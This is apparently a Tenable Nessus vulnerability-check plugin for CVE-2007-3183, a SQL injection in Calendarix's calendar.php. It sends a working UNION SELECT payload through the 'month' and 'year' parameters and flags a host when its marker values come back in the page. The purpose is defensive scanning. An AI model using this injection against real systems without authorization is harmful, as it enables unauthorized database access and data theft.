#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(25567);
  script_version("$Revision: 1.12 $");

  script_cve_id("CVE-2007-3183");
  script_bugtraq_id(24633);
  script_osvdb_id(35373);

  script_name(english:"Calendarix calendar.php Multiple Parameter SQL Injection");
  script_summary(english:"Tries to control output from calendar.php");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Calendarix, a free web-based calendar
application written in PHP. 

The version of Calendarix installed on the remote host fails to
sanitize input to the 'month' and 'year' parameters of the
'calendar.php' script before using it in database queries.  Provided
PHP's 'magic_quotes_gpc' setting is disabled, an unauthenticated
attacker can exploit these flaws to manipulate database queries, which
may lead to disclosure of sensitive information, modification of data,
or attacks against the underlying database." );
 script_set_attribute(attribute:"see_also", value:"http://www.netvigilance.com/advisory0038" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/472221/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/06/26");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/06/25");
 script_cvs_date("$Date: 2011/03/12 01:05:14 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);

pass = unixtime();
user = SCRIPT_NAME;
sql = string("' UNION SELECT 1,1,'", pass, "','", user, "',1 #");
if (thorough_tests) 
{
  exploits = make_list(
    string("/calendar.php?month=", urlencode(str:sql)),
    string("/calendar.php?month=&year=", urlencode(str:sql))
  );
}
else 
{
  exploits = make_list(
    string("/calendar.php?month=", urlencode(str:sql))
  );
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/calendarix", "/calendar", cgi_dirs()));
else dirs = make_list(cgi_dirs());

info = "";
foreach dir (dirs)
{
  # Try to exploit the issue(s).
  foreach exploit (exploits)
  {
    r = http_send_recv3(method:"GET", item:string(dir, exploit), port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if we see our values in the output.
    if (
      "Calendarix" >< res &&
      (  string("<div class=smallcalevtime>", user, "<") >< res &&
        string(');">', pass, '</a>') >< res
      )
    ) info += '  ' + dir + exploit + '\n';
  }
  if (!thorough_tests) break;
}


if (info)
{
  report = string(
    "\n",
    "The following URI(s) demonstrate the issues :\n",
    "\n",
    info
  );
  security_warning(port:port, extra:report);
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
}
